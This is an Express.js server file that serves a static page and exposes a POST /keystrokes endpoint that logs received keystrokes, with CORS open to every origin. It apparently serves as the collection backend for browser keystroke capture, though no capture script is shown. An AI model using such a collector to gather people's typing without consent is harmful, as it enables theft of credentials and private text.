const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');  // Add path module
const app = express();
const port = process.env.PORT || 3000;

// Enable CORS for all routes
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*'); // Adjust as needed for security
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Use body-parser middleware to parse JSON requests
app.use(bodyParser.json());

// Serve static files from the 'public' directory
app.use(express.static('public'));

// Endpoint to receive keystrokes
app.post('/keystrokes', (req, res) => {
    const keystroke = req.body.keystroke;
    console.log('Received keystroke:', keystroke);
    // Save the keystroke or perform other actions here
    res.json({ status: 'Keystroke received' });
});

// Serve index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
